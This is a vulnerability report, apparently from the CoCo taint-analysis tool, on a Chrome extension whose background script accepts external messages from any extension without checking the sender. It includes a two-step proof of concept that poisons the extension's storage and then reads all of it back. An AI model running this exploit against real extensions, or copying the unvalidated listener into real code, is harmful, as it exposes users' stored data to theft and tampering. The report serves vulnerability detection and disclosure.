# CoCo Analysis: icppcklehjhjleamppjpjhpdkhpeblfo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (forming a complete exploitation chain)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/icppcklehjhjleamppjpjhpdkhpeblfo/opgen_generated_files/bg.js
Line 965: Large obfuscated function containing `chrome.runtime.onMessageExternal.addListener`

## Sink 2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/icppcklehjhjleamppjpjhpdkhpeblfo/opgen_generated_files/bg.js
Line 751: `var storage_local_get_source = { 'key': 'value' };`

**Code:**

```javascript
// Background script (bg.js) - Line 965+
chrome.runtime.onMessageExternal.addListener(async(b, c, d) => {
  switch(b.action) {
    case "set": {
      chrome.storage.local.set(b.data), // ← attacker writes arbitrary data to storage
      d({action: "saveData"});
      break;
    }
    case "getConfig": {
      chrome.storage.local.get(null, a => { // ← retrieves ALL storage data
        d(a) // ← sends ALL storage back to attacker via sendResponse
      });
      break;
    }
    case "changecursor": {
      chrome.storage.local.set({item: b.data.item}); // ← another write sink
      // ... additional logic
      break;
    }
    case "clearcursor": {
      chrome.storage.local.set(b.data); // ← another write sink
      d({status: !0});
      break;
    }
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Step 1: Poison storage with malicious data
chrome.runtime.sendMessage(
  "icppcklehjhjleamppjpjhpdkhpeblfo", // extension ID
  {
    action: "set",
    data: {
      maliciousKey: "maliciousValue",
      anotherKey: "sensitiveData"
    }
  },
  (response) => console.log("Data written:", response)
);

// Step 2: Retrieve ALL storage data (including poisoned and legitimate data)
chrome.runtime.sendMessage(
  "icppcklehjhjleamppjpjhpdkhpeblfo",
  { action: "getConfig" },
  (allStorageData) => {
    console.log("Exfiltrated all storage:", allStorageData);
    // Attacker receives all extension storage data
    // Can also retrieve their own poisoned data for other attack vectors
  }
);
```

**Impact:** Complete storage exploitation vulnerability. An external attacker (malicious extension) can:
1. Write arbitrary data to the extension's storage via the "set", "changecursor", or "clearcursor" actions
2. Retrieve ALL storage data via the "getConfig" action, including any legitimate sensitive data the extension stores
3. This enables both storage poisoning attacks and information disclosure of all extension storage contents

The vulnerability exists because `chrome.runtime.onMessageExternal` accepts messages from any external extension without validation, and the "getConfig" handler returns ALL storage data (`chrome.storage.local.get(null)`) directly to the caller via sendResponse.
